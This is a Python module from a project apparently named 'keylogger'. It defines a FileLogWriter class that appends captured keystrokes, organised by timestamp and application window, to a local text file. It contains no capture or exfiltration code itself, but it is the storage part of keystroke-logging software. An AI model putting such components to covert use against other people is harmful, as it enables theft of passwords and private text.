import os
from datetime import datetime

from keylogger.interfaces import ILogWriter


class FileLogWriter(ILogWriter):
    """
    Writes logs to a text file in a structured, readable format.

    This class appends new log entries with timestamps and organizes them per application.
    """

    def __init__(self, file_name='logfile'):
        """Initializes the log writer and ensures the log file exists."""
        self.file_path = f'logs/{file_name}.txt'
        self._ensure_file_exists()

    def _ensure_file_exists(self):
        """Ensures the log file exists, creating it if necessary."""

        # Make sure the directory 'logs' exists, else creating it.
        os.makedirs(os.path.dirname(self.file_path), exist_ok=True)

        if not os.path.exists(self.file_path):
            with open(self.file_path, "w", encoding="utf-8") as file:
                file.write(f"--- Log File Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    def write_log(self, log: dict) -> None:
        """
        Writes the log data to the file in a structured, readable format.

        Args:
            log (dict): A dictionary containing captured keystrokes organized by application and timestamps.
        """
        if not log:
            return  # No log to write

        with open(self.file_path, "a", encoding="utf-8") as file:
            for timestamp, logs in log.items():
                file.write("\n" + "=" * 50 + "\n")
                file.write(timestamp)
                file.write("\n" + "=" * 50)

                for window, keystrokes in logs.items():
                    file.write(f"\n[Application: {window}]\n")
                    file.write(f"Keystrokes: {keystrokes}\n")

            file.write("=" * 50 + "\n")
